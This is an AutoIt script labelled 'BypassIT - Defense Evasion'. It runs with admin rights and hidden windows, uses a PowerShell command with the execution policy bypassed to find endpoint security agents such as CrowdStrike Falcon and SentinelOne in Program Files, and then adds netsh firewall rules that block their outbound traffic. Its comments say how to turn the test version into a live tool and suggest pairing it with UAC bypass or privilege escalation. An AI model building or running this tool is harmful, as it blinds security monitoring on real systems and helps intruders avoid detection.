#cs ----------------------------------------------------------------------------
 BypassIT - Defense Evasion - Deny Outbound EDR Connections - Host Firewall
 AutoIt Version: 3.3.16.1
 Version: 1.0
 Author:         RayZaxs

Script Function:
Script will need to be compiled to an executable and ran as an administrator. It will be most effective in combination with UAC bypass, or PrivEsc.
For Real application take out message boxes at the end and change the .txt file extension to the real .exe - Agent names should be correct.
*Note* More EDR software and AV support in the works

#ce ----------------------------------------------------------------------------
; Require script to be run as admin
#RequireAdmin
#include <Constants.au3>

; Define the filename for the output file
$filename = "command_output.txt"

; Get the current directory
$currentDir = @ScriptDir

; Create the full path for the text file
$filePath = $currentDir & "\" & $filename

; Define the PowerShell command to run - Regex through Program Files looking for EDR software agents (For testing purposes I created txt files (change to exe for real application)
$string = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path \"C:\\Program Files\" -Recurse -File -Filter \"*.txt\" -ErrorAction SilentlyContinue | Where-Object { \"CSFalconService\", \"SentinelOne\", \"nwmagent\", \"agent\" -contains $_.BaseName } | Select-Object -ExpandProperty FullName"'

; Run the PowerShell command
RunWait($string & " > """ & $filePath & """", @ScriptDir, @SW_HIDE)

; Check if the file has been created
If FileExists($filePath) Then
    MsgBox(0, "Success", "The command output has been written to: " & $filePath)
Else
    MsgBox(0, "Error", "Failed to write the command output.")
EndIf


; Create an array to hold the contents of the output - Initialize with 1 element
Local $fileContents[1]

; Check if the file exists before reading
If FileExists($filename) Then
    ; Read the file into the array line by line
    $fileContents = FileReadToArray($filename)

    ; Iterate through the array
    For $i = 0 To UBound($fileContents) - 1
        ; Get the full file path
        $filePath = $fileContents[$i]

        ; Extract the file name by splitting the string at the last backslash
        $fileName = StringTrimLeft($filePath, StringInStr($filePath, "\", 0, -1))


        ; Create the netsh command string using the file name and path variables
        $netshCommand = 'netsh advfirewall firewall add rule name="Deny Outbound for ' & $fileName & '" dir=out action=block program="' & $filePath & '" enable=yes'

        ; Run the command to add the firewall rule(s)
        RunWait($netshCommand, "", @SW_HIDE) ; Run in hidden mode to avoid a command prompt window showing up

        ; Check if the rule was successfully added (Delete/Disable for Real World Application)
        MsgBox(0, "Success", "Firewall rule added for: " & $fileName)
    Next

    MsgBox(0, "Complete", "All firewall rules have been added.")

Else
    MsgBox(0, "Error", "The specified text file does not exist!")
EndIf
